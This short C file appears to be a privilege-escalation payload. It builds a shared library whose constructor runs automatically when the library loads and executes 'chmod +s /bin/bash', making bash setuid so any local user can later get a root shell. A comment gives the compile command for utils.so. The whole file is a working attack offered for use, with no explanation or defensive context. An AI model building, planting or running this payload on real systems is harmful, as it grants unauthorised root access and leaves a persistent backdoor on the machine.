#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor)); 

void inject() {
        system("chmod +s /bin/bash");
}
// gcc -fPIC -shared -o utils.so PE.c -nostartfiles 
